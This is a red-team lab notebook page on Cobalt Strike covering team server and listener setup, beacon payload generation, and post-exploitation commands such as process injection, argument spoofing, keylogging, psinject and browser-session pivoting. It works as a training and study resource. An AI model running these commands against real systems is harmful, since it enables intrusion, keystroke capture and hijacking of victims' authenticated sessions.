# Cobalt Strike 101

This lab is for exploring the advanced penetration testing / post-exploitation tool Cobalt Strike.

{% hint style="info" %}
WIP
{% endhint %}

## Definitions

* Listener - a service running on the attacker's C2 server that is listening for beacon callbacks
* Beacon - a malicious agent / implant on a compromised system that calls back to the attacker controlled system and checks for any new commands that should be executed on the compromised system
* Team server - Cobalt Strike's server component. Team server is where listeners for beacons are set up. Team server allows attackers to instruct beacons to execute commands such as record keystrokes, dump passwords, etc on compromised systems.

## Getting Started

Cobalt Strike has client and server side components to it. First, we need to run the team server.

### Team Server

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
# the syntax is ./teamserver <serverIP> <password> <~killdate> <~profile>
# ~ optional for now
root@/opt/cobaltstrike# ./teamserver 10.0.0.5 password
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-06-22-47-10.png)

{% hint style="info" %}
Note that in real life red team engagements, you would put the team servers behind redirectors to add resilience to your attacking infrastructure. See [Red Team Infrastructure](red-team-infrastructure/)
{% endhint %}

### Cobalt Strike Client

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
root@/opt/cobaltstrike# ./cobaltstrike
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Enter the following:

* host - team server IP or DNS name
* user - anything you like - it's just a nickname
* password - your team server password

![](../.gitbook/assets/screenshot-from-2019-01-06-22-51-40.png)

### Demo

All of the above steps are shown below in one enimated gif:

![](../.gitbook/assets/peek-2019-01-06-22-56.gif)

## Setting Up Listener

Give your listener a descriptive name and a port number:

![](../.gitbook/assets/peek-2019-01-07-18-01.gif)

## Generating a Stageless Payload

Choose the listener your payload will connect back to, choose payload architecture and you are done:

![](../.gitbook/assets/peek-2019-01-07-18-03.gif)

## Receiving First Call Back

On the left is a victim machine, executing the previously generated beacon:

![](../.gitbook/assets/peek-2019-01-07-18-15.gif)

## Interacting with Beacon

![](../.gitbook/assets/screenshot-from-2019-01-07-18-22-38.png)

## Interesting Commands & Features

### Argue

Argue command allows the attacker to spoof commandline arguments of the process being launched.

The below spoofs calc cmdline parameters:

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> argue calc /spoofed
beacon> run calc
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-19-18-23.png)

Note, however the commandline parameters in sysmon vs procexp:

![](../.gitbook/assets/screenshot-from-2019-01-07-19-09-47.png)

Argument spoofing is done via manipulating memory structures in Process Environment Block which I have some notes about:

{% page-ref page="../offensive-security-experiments/masquerading-processes-in-userland-through-\_peb.md" %}

{% page-ref page="../memory-forensics/process-environment-block.md" %}

### Inject

Inject is very similar to metasploits migrate function and allows us to move our beacon into another process on the victim system:

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> help inject
Use: inject [pid] <x86|x64> [listener]

inject 776 x64 httplistener
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/peek-2019-01-07-20-16.gif)

### Keylogger

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> keylogger 1736 x64
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-31-30.png)

### Screenshot

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> screenshot 1736 x64
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-33-51.png)

### Runu

Runu allows us launching a new process from a specified parent process:

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
runu 2316 calc
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-39-20.png)

### Psinject

This function allows an attacker executing powershell scripts from any process  of the victim system. Note that PID 2872 is the calc.exe process seen in the above screenshot related to `runu`:

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> psinject 2872 x64 get-childitem c:\
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-44-30.png)

Highlighted in green are new handles that are opened in the target process when powershell script is being injected:

![](../.gitbook/assets/screenshot-from-2019-01-07-20-52-16.png)

### Spawnu

Spawn a session with powershell payload from a given parent PID:

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> spawnu 3848 httplistener
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-57-30.png)

![](../.gitbook/assets/screenshot-from-2019-01-07-20-57-25.png)

### Browser Pivoting

This feature enables an attacker riding on compromised user's browsing sessions.

The way this attack works is best explained with an example:

* Victim log's in to some web application using internet explorer. We assume that the victim host is already beaconing back to the team server.
* Attacker/operator creates a browser pivot by issuing a `browserpivot` command to the beacon
* The beacon creates a proxy on the victim system \(in Internet Explorer process to be more precise\) by binding and listening to a port, say 6605
* Team server binds and starts listening to a port, say 33912
* Attacker can now use their teamserver:33912 as a web proxy. All the traffic that goes through this proxy will be forwarded/traverse the proxy opened on the victim system via the Internet Explorer process. Since Internet Explorer relies on WinINet library for managing web requests and authentication, attackers web requests will be reauthenticated and handled for free allowing attackers to view the same applications the victim has active sessions to.

Browser pivotting in cobalt strike:

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> browserpivot 244 x86
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Note how the iexplore.exe opened up port 6605 for listening:

![](../.gitbook/assets/screenshot-from-2019-01-07-21-23-50.png)

On the left - a victim system logged to some application and on the right - attacker trying to access the same application is presented with a login screen:

![](../.gitbook/assets/screenshot-from-2019-01-07-21-33-54.png)

The story changes if the attacker starts proxying his web traffic through the victim setup proxy 10.0.0.5:33912. The below illustrates the attack visually. On the left is a victim with a compromised Internet Explorer \(with a proxy server running and explosed for the attacker\) and on the right is attacker proxying his web traffic through the victim:

![](../.gitbook/assets/peek-2019-01-07-21-36.gif)

### System Profiler

A nice feature that profiles potential victims by gathering information on what software / plugins victim systems have installed:

![](../.gitbook/assets/screenshot-from-2019-01-07-21-52-32.png)

The profilder URL, once visited, enumerates the system and presents findings in the Application view:

![](../.gitbook/assets/screenshot-from-2019-01-07-21-52-58.png)

Event logs will show how many times the profiler has been used by victims:

![](../.gitbook/assets/screenshot-from-2019-01-07-21-52-50.png)





